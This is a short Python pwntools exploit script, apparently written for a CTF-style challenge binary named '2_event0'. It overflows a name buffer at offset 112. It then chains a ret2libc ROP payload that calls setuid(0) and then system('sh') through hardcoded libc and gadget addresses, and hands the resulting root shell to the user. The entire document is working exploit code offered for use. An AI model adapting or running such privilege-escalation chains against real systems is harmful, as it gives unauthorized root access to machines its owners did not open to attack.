#!/usr/bin/python

from pwn import *

# Starts the process
p = process("./2_event0")

# For skipping of menu
time = 0.2

def main():
	# Skips prompt
	skip_prompt()	

	# Sends rubbish first
	buf = "Rubbish"
	p.send(buf)

	# For GDB purposes
	raw_input(str(p.proc.pid))

	# 0xf7e4fda0 <system> 
	system_addr = 0xf7e4fda0
	log.info("system addr : 0x%x" %system_addr)

	# 0xf7ec62e0 <setuid>
	setuid_addr = 0xf7ec62e0
	log.info("setuid addr : 0x%x" %setuid_addr)

	# libc : 0xf7e235f7 --> 0x5f006873 ('sh') 
	sh_addr = 0xf7e235f7 
	log.info("/bin/sh : 0x%x" %sh_addr)

	# 0x0804891a : pop edi ; pop ebp ; ret
	pop_r = 0x0804891b  # pop, ret
	log.info("pop ret: 0x%x" %pop_r)

	'''
	gdb-peda$ pattern_offset 0x41384141
	1094205761 found at offset: 112
	'''
	select_name()

	# Payload crafting
	payload = "A" * 112

	# Setuid 0, pop
	payload += p32(setuid_addr)
	payload += p32(pop_r)
	payload += p32(0x0) 

	# system("sh")
	payload += p32(system_addr)
	payload += '\x90' * 4
	payload += p32(sh_addr)

	# Sends payload
	p.send(payload)

	# Pass interaction back to user
	p.interactive()

def skip_prompt():
	p.recvrepeat(time)

def select_name():
	p.sendline("2") # Selects name
	skip_prompt()


if __name__ == "__main__":
	main()
